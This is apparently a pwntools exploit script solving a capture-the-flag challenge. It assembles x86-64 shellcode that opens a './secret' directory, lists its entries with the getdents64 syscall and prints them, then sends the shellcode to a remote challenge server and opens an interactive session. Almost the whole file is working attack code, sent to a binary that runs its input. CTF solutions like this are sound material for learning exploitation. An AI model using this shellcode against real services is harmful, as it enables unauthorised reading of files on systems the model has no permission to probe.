from pwn import *

binary = './chall'
context.binary = binary

# Change to remote if needed

p = process(binary)
p = remote("chal.polyuctf.com", 35145)
s = '''
'''

#gdb.attach(p, s)

shellcode = asm('''
    /* Open a directory using openat */
    mov rax, 257        /* openat syscall */
    mov rdi, -100       /* AT_FDCWD (current directory) */
    lea rsi, [rip+dir]  /* pointer to the dirrectory string */
    xor rdx, rdx        
    xor r10, r10     
    syscall
    
    /* Save fd*/
    mov r12, rax
    
    /* Allocate buffer on stack for directory entries */
    sub rsp, 1024
    mov rbp, rsp        /* Save buffer address in rbp */
    
    /* Use getdents64 to do ls */
    mov rax, 217        /* getdents64 */
    mov rdi, r12        /* fd */
    mov rsi, rbp        /* buffer address */
    mov rdx, 1024       /* buffer size */
    syscall
    
    /* Save number of bytes read */
    mov r13, rax
    
    /* write */
    mov rax, 1          
    mov rdi, 1          
    mov rsi, rbp        
    mov rdx, r13        
    syscall

dir:
    .string "./secret" /* Current directory, adjust this to "./secret" later to see stuff inside secret */
''')

p.sendline(shellcode)
p.interactive()
